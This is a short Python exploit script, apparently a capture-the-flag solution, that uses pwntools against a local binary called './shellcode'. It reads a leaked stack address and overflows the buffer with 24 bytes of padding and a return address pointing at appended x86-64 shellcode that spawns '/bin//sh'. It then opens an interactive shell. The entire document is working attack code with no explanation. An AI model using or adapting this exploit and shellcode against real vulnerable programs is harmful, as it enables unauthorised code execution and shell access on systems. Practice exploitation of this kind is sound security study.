from pwn import *
context(arch = 'amd64',os = 'linux')
p = process('./shellcode')
gdb.attach(p)
p.recvuntil('[')
retnaddr = p.recv(14)
retnaddr = int(retnaddr,16)
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
playload = 'A'*24 + p64(retnaddr + 32) + shellcode
p.sendline(playload)
p.interactive()
